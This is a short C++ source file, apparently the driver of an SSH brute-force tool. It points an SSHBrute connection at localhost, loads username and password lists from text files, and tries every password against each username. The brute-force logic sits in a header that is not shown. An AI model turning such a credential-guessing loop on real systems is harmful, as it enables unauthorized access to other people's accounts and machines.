#include <iostream>
#include <vector>
#include "sshBrute.h"
#include "utility.h"
using namespace std;

int main()
{
    SSHBrute conn("localhost");
    vector<string> username = readFile("username.txt");
    vector<string> password = readFile("password.txt");
    for (int i = 0; i < username.size(); i++) {
        conn.setUser(username[i]);
        conn.connect(password);
    }
    return 0;
}
